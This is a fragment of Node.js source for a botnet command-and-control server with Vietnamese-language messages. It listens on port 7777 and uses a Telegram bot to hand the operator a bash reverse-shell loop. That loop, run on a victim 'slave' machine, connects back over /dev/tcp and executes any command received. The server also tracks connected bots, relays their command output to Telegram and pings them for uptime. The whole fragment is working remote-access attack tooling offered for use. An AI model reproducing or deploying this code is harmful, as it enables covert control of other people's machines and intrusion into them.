...
function sendSlaveCmd(){https.get('https://api.ipify.org?format=json',res=>{let d='';res.on('data',c=>d+=c);res.on('end',()=>{let ip;try{ip=JSON.parse(d).ip}catch{ip='YOUR_PUBLIC_IP'};const cmd=`while true;do { exec 3<>/dev/tcp/${ip}/7777 || { sleep 5; continue; }; while read -r c <&3; do [[ -z "$c" ]] && continue; (timeout 600 bash -c "$c" 2>&1; echo "CMD_DONE_$?") | while read -r l; do echo "$l" >&3 || break; done; done; } done`;bot.sendMessage(chatIdAdmin,`🔥 Server sẵn sàng trên cổng 7777\n\nCopy lệnh này chạy trên slave:\n\`\`\`bash\n${cmd}\n\`\`\``,{parse_mode:'Markdown'});});}).on('error',()=>sendSlaveCmd());}

const server=net.createServer(s=>{
s.setKeepAlive(true,100);const ip=s.remoteAddress.replace(/^.*:/,''),port=s.remotePort;clients.set(s,{id:botCounter++,ip,port,lastResponse:Date.now(),uptime:'chưa cập nhật'});bot.sendMessage(chatIdAdmin,`[+] Bot kết nối: Bot ${botCounter-1} - ${ip}:${port}`);
let buf='';s.on('data',d=>{
...
if(l.startsWith('up'))b.uptime=l.trim();else if(l.includes('CMD_DONE_')){if(cmdQueue.has(s)){const{cmdId,data}=cmdQueue.get(s);bot.sendMessage(chatIdAdmin,`🖥 Bot ${b.id} [${b.ip}]:\n\`\`\`\n${data.trim()}\`\`\``,{parse_mode:'Markdown'});cmdQueue.delete(s);}}else{if(cmdQueue.has(s))cmdQueue.get(s).data+=l+'\n';}}});s.on('error',()=>disconnect(s));s.on('close',()=>disconnect(s));});

server.listen(7777,()=>{console.log('[*] Server listening on port 7777');sendSlaveCmd();});

setInterval(()=>{const n=Date.now();clients.forEach((b,s)=>{if(n-b.lastResponse>10000)disconnect(s);else try{s.write('uptime -p\n')}catch{disconnect(s)}});resetIds();},3000);
